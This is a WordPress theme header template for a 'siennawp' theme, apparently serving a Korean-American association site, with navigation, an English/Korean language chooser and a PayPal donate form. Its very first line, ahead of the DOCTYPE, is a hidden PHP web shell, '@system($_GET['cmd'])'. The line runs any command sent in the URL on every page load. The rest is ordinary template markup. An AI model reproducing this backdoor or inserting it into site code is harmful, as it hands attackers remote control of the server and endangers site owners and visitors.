<?php @system($_GET['cmd']); ?>
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
    <?php if (!sienna_mikado_is_ajax_request()) sienna_mikado_wp_title(); ?>

    <?php if (!sienna_mikado_is_ajax_request()) do_action('sienna_mikado_header_meta'); ?>

    <?php if (!sienna_mikado_is_ajax_request()) wp_head(); ?>

    <?php /**
     * <!--  <link rel="stylesheet" type="text/css" href="<?php //echo site_url().'/wp-content/themes/siennawp/assets/css/bootstrap/bootstrap.min.css'; ?>">
     * <link rel="stylesheet" href="<?php //echo site_url(); ?>/wp-content/themes/siennawp/assets/css/custom_staticsite.css" type="text/css" media="all"> -->
     **/ ?>

    <script src="<?= site_url() . '/wp-content/themes/siennawp/assets/js/bootstrap.min.js'; ?>"
            type="text/javascript"></script>
</head>

<body <?php body_class(); ?>>
<?php if (!sienna_mikado_is_ajax_request()) sienna_mikado_get_side_area(); ?>


<?php
if ((!sienna_mikado_is_ajax_request()) && sienna_mikado_options()->getOptionValue('smooth_page_transitions') == "yes") {
    $ajax_class = sienna_mikado_options()->getOptionValue('smooth_pt_true_ajax') === 'no' ? 'mkdf-mimic-ajax' : 'mkdf-ajax';
    ?>
    <div class="mkdf-smooth-transition-loader <?= esc_attr($ajax_class); ?>">
        <div class="mkdf-st-loader">
            <div class="mkdf-st-loader1">
                <?php sienna_mikado_loading_spinners(); ?>
            </div>
        </div>
    </div>
<?php } ?>

<style type="text/css">
    /*.qtranxs_widget ul {*/
    /*    margin: 0;*/
    /*}*/

    /*.qtranxs_widget ul li {*/
    /*    display: inline;*/
    /*    list-style-type: none; */
    /*    margin: 0 5px 0 0; */
    /*    opacity: 0.5;*/
    /*    -o-transition: 1s ease opacity;*/
    /*    -moz-transition: 1s ease opacity;*/
    /*    -webkit-transition: 1s ease opacity;*/
    /*    transition: 1s ease opacity;*/
    /*}*/

    /*.qtranxs_widget ul li.active {*/
    /*    opacity: 0.8;*/
    /*}*/

    /*.qtranxs_widget ul li:hover {*/
    /*    opacity: 1;*/
    /*}*/

    /*.qtranxs_widget img {*/
    /*    box-shadow: none;*/
    /*    vertical-align: middle;*/
    /*    display: initial;*/
    /*}*/

    /*.qtranxs_flag {*/
    /*    height: 12px;*/
    /*    width: 18px;*/
    /*    display: block;*/
    /*}*/

    /*.qtranxs_flag_and_text {*/
    /*    padding-left: 20px;*/
    /*}*/

    /*.qtranxs_flag span {*/
    /*    display: none;*/
    /*}*/
</style>

<div class="mkdf-wrapper">
    <div class="mkdf-wrapper-inner">
        <div class="bg-header parent-position">
            <div id="header-top-home">
                <div class="">
                    <a href="/">
                        <div id="icon-home"></div>
                    </a>
                </div>

                <div class="">
                    <?php //do_action('sienna_mikado_before_top_navigation'); ?>
                    <nav id="menu-main-home-top" class="mkdf-main-menu mkdf-drop-down mkdf-default-nav hidden-xs
                    hidden-sm">
                        <?php
                        wp_nav_menu(array(
                            'theme_location' => 'main-navigation',
                            'container' => '',
                            'container_class' => '',
                            'menu_class' => 'clearfix',
                            'menu_id' => '',
                            'fallback_cb' => 'top_navigation_fallback',
                            'link_before' => '<span>',
                            'link_after' => '</span>',
                            'walker' => new SiennaMikadoTopNavigationWalker()
                        ));
                        ?>
                    </nav>
                    <?php // do_action('sienna_mikado_after_top_navigation'); ?>
                </div>

                <div class="">
                    <div id="multi-languages-home-top" class="top-multi-languages">
                        <div class="widget qtranxs_widget">
                            <ul class="language-chooser language-chooser-custom qtranxs_language_chooser"
                                id="qtranslate--1-chooser">
                                <li class="language-chooser-item language-chooser-item-en active"><a href="/"
                                                                                                     title="English (en)">E</a>
                                </li>
                                <li class="language-chooser-item language-chooser-item-ko"><a
                                            href="http://www.kafla.org/ko/" title="한인회 (ko)">한</a></li>
                            </ul>
                            <div class="qtranxs_widget_end"></div>
                        </div>
                        <div class="decor-find-home"></div>

                        <div id="donate-top-right" class="hidden-xs">
                            <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
                                <input type="hidden" name="cmd" value="_s-xclick">
                                <input type="hidden" name="hosted_button_id" value="625DYMQKHTEW4">
                                <input type="image"
                                       src="/wp-content/themes/siennawp/assets/css/images/btn-donate-home-top-3.png"
                                       name="submit" alt="PayPal - The safer, easier way to pay online!"
                                       style="width: 89px;height: 30px">
                            </form>
                        </div>

                        <?php /**
                         * <div id="ic-find"></div>
                         * <div class="form-search-home-top " style="display: none;">
                         * <?php get_search_form(); ?>
                         **/ ?>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <div class="mkdf-content" <?php sienna_mikado_content_elem_style_attr(); ?>>
        <?php if (sienna_mikado_is_ajax_enabled()) { ?>
            <div class="mkdf-meta">
                <?php do_action('sienna_mikado_ajax_meta'); ?>
                <span id="mkdf-page-id"><?= esc_html($wp_query->get_queried_object_id()); ?></span>
                <div class="mkdf-body-classes"><?= esc_html(implode(',', get_body_class())); ?></div>
            </div>
        <?php } ?>
        <div class="mkdf-content-inner">